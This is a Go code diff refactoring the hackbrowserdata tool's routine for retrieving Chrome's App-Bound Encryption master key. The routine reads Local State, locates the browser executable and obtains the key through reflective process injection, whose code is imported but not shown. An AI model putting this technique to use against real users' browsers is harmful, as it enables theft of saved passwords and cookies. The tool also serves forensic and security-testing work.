@@ -3,18 +3,18 @@
 package masterkey
 
 import (
+	"context"
 	"encoding/base64"
 	"errors"
 	"fmt"
 	"os"
-	"strings"
 
 	"github.com/tidwall/gjson"
 
 	"github.com/moond4rk/hackbrowserdata/crypto/windows/payload"
 	"github.com/moond4rk/hackbrowserdata/internal/log"
+	"github.com/moond4rk/hackbrowserdata/internal/winapi"
 	"github.com/moond4rk/hackbrowserdata/utils/injector"
-	"github.com/moond4rk/hackbrowserdata/utils/winutil"
 )
 
 const envEncKeyB64 = "HBD_ABE_ENC_B64"
@@ -23,19 +23,19 @@ var appbPrefix = []byte{'A', 'P', 'P', 'B'}
 
 var errNoABEKey = errors.New("abe: Local State has no app_bound_encrypted_key")
 
-type ABERetriever struct{}
+type abeRetriever struct{}
 
-func (r *ABERetriever) RetrieveKey(hints Hints) ([]byte, error) {
-	// Non-ABE forks (Opera/Vivaldi/Yandex) supply no WindowsABEKey — treat as "not applicable".
-	// (Pre-v20 Chrome takes the errNoABEKey path below.)
-	browserKey := strings.TrimSpace(hints.WindowsABEKey)
-	if browserKey == "" {
-		return nil, nil
+func (abeRetriever) Version() Version { return V20 }
+
+func (abeRetriever) Retrieve(_ context.Context, loc Locator) ([]byte, error) {
+	// Non-ABE forks (Opera/Vivaldi/Yandex) have no ABE kind; pre-v20 Chrome takes the errNoABEKey path below.
+	if loc.ABE == ABENone {
+		return nil, ErrNotApplicable
 	}
 
-	encKey, err := loadEncryptedKey(hints.LocalStatePath)
+	encKey, err := loadEncryptedKey(loc.LocalState)
 	if errors.Is(err, errNoABEKey) {
-		return nil, nil
+		return nil, ErrNotApplicable
 	}
 	if err != nil {
 		return nil, err
@@ -46,7 +46,7 @@ func (r *ABERetriever) RetrieveKey(hints Hints) ([]byte, error) {
 		return nil, fmt.Errorf("abe: %w", err)
 	}
 
-	exePath, err := winutil.ExecutablePath(browserKey)
+	exePath, err := winapi.ExecutablePath(loc.Exe, loc.ExeFallbacks)
 	if err != nil {
 		return nil, fmt.Errorf("abe: %w", err)
 	}
@@ -63,7 +63,7 @@ func (r *ABERetriever) RetrieveKey(hints Hints) ([]byte, error) {
 	if len(key) != 32 {
 		return nil, fmt.Errorf("abe: unexpected key length %d (want 32)", len(key))
 	}
-	log.Infof("abe: retrieved %s master key via reflective injection", browserKey)
+	log.Infof("abe: retrieved %s master key via reflective injection", loc.Exe)
 	return key, nil
 }
 
